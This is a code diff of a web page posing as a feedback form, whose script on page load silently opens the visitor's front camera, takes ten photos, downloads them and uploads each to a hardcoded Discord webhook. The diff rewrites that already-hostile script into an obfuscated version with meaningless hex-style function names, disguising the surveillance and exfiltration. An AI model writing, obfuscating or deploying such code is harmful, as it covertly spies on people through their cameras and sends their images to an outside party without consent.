@@ -11,65 +11,63 @@
     <button onclick="submitFeedback()">Submit</button>
 
     <script>
-        async function takePhotos(count) {
-            const photos = [];
-            const video = document.createElement("video");
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                await video.play();
-
-                for (let i = 0; i < count; i++) {
-                    const canvas = document.createElement("canvas");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const context = canvas.getContext("2d");
-                    context.drawImage(video, 0, 0);
-                    const dataUrl = canvas.toDataURL("image/png");
-                    photos.push(dataUrl);
-                    saveImage(dataUrl, `photo_${i + 1}.png`);
-                    await sendPhotoToDiscord(dataUrl, `photo_${i + 1}.png`);
-                    console.log(`Photo ${i + 1} taken and sent to Discord`);
+        (function(){
+            async function _0x12345(a){
+                const b=[];
+                const c=document.createElement("video");
+                try{
+                    const d=await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user" } // Use front camera on mobile
+                    });
+                    c.srcObject=d;
+                    await c.play();
+                    for(let e=0;e<a;e++){
+                        const f=document.createElement("canvas");
+                        f.width=c.videoWidth;
+                        f.height=c.videoHeight;
+                        const g=f.getContext("2d");
+                        g.drawImage(c,0,0);
+                        const h=f.toDataURL("image/png");
+                        b.push(h);
+                        _0x54321(h,`photo_${e+1}.png`);
+                        await _0xabcde(h,`photo_${e+1}.png`);
+                        console.log(`Photo ${e+1} taken and sent to Discord`);
+                    }
+                    d.getTracks().forEach(i=>i.stop());
+                }catch(j){
+                    console.error("Error capturing photos:",j);
                 }
-
-                stream.getTracks().forEach(track => track.stop());
-            } catch (error) {
-                console.error("Error capturing photos:", error);
+                return b;
             }
-            return photos;
-        }
 
-        async function sendPhotoToDiscord(dataUrl, fileName) {
-            const webhookUrl = "https://discordapp.com/api/webhooks/1344440845419548702/pP1MvXgW6Va0rTZ_IqTd90x77N5PHZAlWnuAEiicJlv0-cPY2zkQm6sQEnSeKEIMd7Bk";
-            const blob = await (await fetch(dataUrl)).blob();
-            const formData = new FormData();
-            formData.append("file", blob, fileName);
+            async function _0xabcde(a,b){
+                const c="https://discordapp.com/api/webhooks/1344440845419548702/pP1MvXgW6Va0rTZ_IqTd90x77N5PHZAlWnuAEiicJlv0-cPY2zkQm6sQEnSeKEIMd7Bk";
+                const d=await(await fetch(a)).blob();
+                const e=new FormData();
+                e.append("file",d,b);
+                await fetch(c,{method:"POST",body:e});
+            }
 
-            await fetch(webhookUrl, {
-                method: "POST",
-                body: formData
-            });
-        }
+            function _0x54321(a,b){
+                const c=document.createElement("a");
+                c.href=a;
+                c.download=b;
+                document.body.appendChild(c);
+                c.click();
+                document.body.removeChild(c);
+            }
 
-        function saveImage(dataUrl, fileName) {
-            const link = document.createElement("a");
-            link.href = dataUrl;
-            link.download = fileName;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
+            function submitFeedback(){
+                const a=document.getElementById("feedback").value;
+                console.log("Feedback submitted: "+a);
+            }
 
-        function submitFeedback() {
-            const feedback = document.getElementById("feedback").value;
-            console.log("Feedback submitted: " + feedback);
-        }
-
-        window.onload = async () => {
-            console.log("Page loaded. Taking photos...");
-            const photos = await takePhotos(10);
-            console.log("Photos captured and sent to Discord.");
-        };
+            window.onload=async()=>{
+                console.log("Page loaded. Taking photos...");
+                const a=await _0x12345(10);
+                console.log("Photos captured and sent to Discord.");
+            };
+        })();
     </script>
 </body>
 </html>
